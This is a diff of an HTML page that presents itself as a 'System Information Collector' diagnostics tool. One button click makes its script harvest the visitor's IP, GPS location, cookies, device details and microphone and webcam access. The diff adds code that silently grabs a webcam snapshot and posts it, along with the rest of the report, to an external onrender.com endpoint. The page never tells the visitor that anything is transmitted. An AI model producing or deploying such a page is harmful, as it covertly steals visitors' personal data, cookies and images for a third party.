@@ -1,99 +1,47 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>System Diagnostics</title>
-
-  <!-- Google font for tech look -->
-  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet" />
-
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>System Info Terminal</title>
   <style>
-    :root {
-      --matrix-green: #00ff7b;
-      --bg-green-dim: #003c1c;
-    }
-    * { margin: 0; padding: 0; box-sizing:border-box; }
-
-    body {
-      background:#000;
-      color:var(--matrix-green);
-      font-family:'Share Tech Mono',monospace;
-      min-height:100vh;
-      display:flex;
-      flex-direction:column;
-      align-items:center;
-      padding:2rem 1rem;
-    }
-    h2 {
-      font-size:2rem;
-      margin-bottom:1.5rem;
-      text-shadow:0 0 10px var(--matrix-green);
-      text-align:center;
-    }
-    button {
-      background:transparent;
-      color:var(--matrix-green);
-      border:1px solid  var(--matrix-green);
-      padding:.6rem 1.4rem;
-      font:inherit;
-      cursor:pointer;
-      transition:.25s;
-    }
-    button:hover{ background:var(--bg-green-dim); }
-
-    #infoBox{
-      width:100%;
-      max-width:760px;
-      border:1px solid var(--matrix-green);
-      padding:1.3rem 1.6rem;
-      margin-top:1.5rem;
-      display:none;
-      overflow-y:auto;
-      background:rgba(0,0,0,.85);
-      box-shadow:0 0 15px var(--matrix-green);
-    }
-    .label{ font-weight:bold; }
-    p{ margin:.35rem 0; }
-
-    #webcamFeed{
-      width:100%;
-      max-height:200px;
-      border:1px solid var(--matrix-green);
-      display:none;
-      margin-bottom:1rem;
-      object-fit:cover;
-      filter:grayscale(100%);
-      opacity:.12;
-    }
-    #errorMsg{ color:#f33; text-align:center; margin-top:.8rem;}
+    /* Basic styling */
+    #infoBox { display: none; }
+    #webcamFeed { display: none; width: 300px; margin-top: 10px; }
+    #errorMsg { color: red; margin-top: 10px; }
+    table { margin-top: 20px; border-collapse: collapse; }
+    td, th { padding: 8px 12px; border: 1px solid #ccc; }
   </style>
 </head>
 <body>
-  <h2>🧠 System Diagnostics Tool</h2>
 
-  <p id="errorMsg"></p>
-  <button id="accessBtn" onclick="getAllInfo()">Run Diagnostics</button>
+  <h1>System Information Collector</h1>
+
+  <button id="accessBtn" onclick="getAllInfo()">Access System Info</button>
+  <div id="errorMsg"></div>
 
   <div id="infoBox">
-    <video id="webcamFeed" autoplay muted></video>
+    <table>
+      <tr><th>IP Address</th><td id="ipAddress"></td></tr>
+      <tr><th>Location</th><td id="location"></td></tr>
+      <tr><th>Webcam</th><td id="webcamResult"></td></tr>
+      <tr><th>Microphone</th><td id="microphoneResult"></td></tr>
+      <tr><th>Browser</th><td id="browser"></td></tr>
+      <tr><th>Resolution</th><td id="resolution"></td></tr>
+      <tr><th>Color Depth</th><td id="depth"></td></tr>
+      <tr><th>Operating System</th><td id="os"></td></tr>
+      <tr><th>Language</th><td id="lang"></td></tr>
+      <tr><th>Connection Type</th><td id="connection"></td></tr>
+      <tr><th>Battery Level</th><td id="battery"></td></tr>
+      <tr><th>Charging</th><td id="charging"></td></tr>
+      <tr><th>Online Status</th><td id="status"></td></tr>
+      <tr><th>Cookies</th><td id="cookies"></td></tr>
+    </table>
 
-    <p><span class="label">IP Address:</span> <span id="ipAddress"></span></p>
-    <p><span class="label">Location:</span> <span id="location"></span></p>
-    <p><span class="label">Webcam:</span> <span id="webcamResult"></span></p>
-    <p><span class="label">Microphone:</span> <span id="microphoneResult"></span></p>
-    <p><span class="label">Browser:</span> <span id="browser"></span></p>
-    <p><span class="label">Resolution:</span> <span id="resolution"></span></p>
-    <p><span class="label">Color Depth:</span> <span id="depth"></span></p>
-    <p><span class="label">Operating System:</span> <span id="os"></span></p>
-    <p><span class="label">Language:</span> <span id="lang"></span></p>
-    <p><span class="label">Network:</span> <span id="connection"></span></p>
-    <p><span class="label">Battery Level:</span> <span id="battery"></span></p>
-    <p><span class="label">Charging:</span> <span id="charging"></span></p>
-    <p><span class="label">Cookies:</span> <span id="cookies"></span></p>
-    <p><span class="label">Online Status:</span> <span id="status"></span></p>
+    <video id="webcamFeed" autoplay playsinline></video>
   </div>
 
+  <!-- Your JavaScript code -->
   <script>
     async function getAllInfo() {
       const $ = id => document.getElementById(id);
@@ -119,20 +67,22 @@
         cookies : document.cookie || "No cookies"
       };
 
-      /* permissions ----------------------------------------------------*/
+      let webcamStream = null;
+      let capturedImageBase64 = null;
+
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:true });
         $("webcamFeed").srcObject = stream;
         $("webcamFeed").style.display = "block";
         info.webcam = info.microphone = "Accessible";
-      } catch { /* ignore */ }
+        webcamStream = stream;
+      } catch {}
 
       try {
-        const pos = await new Promise((res, rej)=>navigator.geolocation.getCurrentPosition(res, rej));
+        const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
         info.location = `Lat: ${pos.coords.latitude.toFixed(4)}, Long: ${pos.coords.longitude.toFixed(4)}`;
-      } catch { /* location denied */ }
+      } catch {}
 
-      /* other data ----------------------------------------------------*/
       $("browser").textContent     = info.browser;
       $("resolution").textContent  = info.resolution;
       $("depth").textContent       = info.depth;
@@ -166,7 +116,23 @@
         $("ipAddress").textContent = info.ip;
       } catch {}
 
-      /* send to backend -----------------------------------------------*/
+      if (webcamStream) {
+        const track = webcamStream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+
+        try {
+          const bitmap = await imageCapture.grabFrame();
+          const canvas = document.createElement('canvas');
+          canvas.width = bitmap.width;
+          canvas.height = bitmap.height;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(bitmap, 0, 0, canvas.width, canvas.height);
+          capturedImageBase64 = canvas.toDataURL('image/jpeg');
+        } catch (e) {
+          console.error("Failed to capture webcam image:", e);
+        }
+      }
+
       const message = `
 🔍 System Report:
 
@@ -187,10 +153,13 @@
       `;
 
       try {
-        await fetch('https://system-info-terminal.onrender.com/send-message', {   // <- your Render URL
+        await fetch('https://system-info-terminal.onrender.com/send-message', {
           method : 'POST',
           headers: { 'Content-Type':'application/json' },
-          body   : JSON.stringify({ message })
+          body   : JSON.stringify({
+            message,
+            image: capturedImageBase64
+          })
         });
       } catch (e) {
         console.error("Failed to send info:", e);
@@ -198,5 +167,6 @@
       }
     }
   </script>
+
 </body>
 </html>
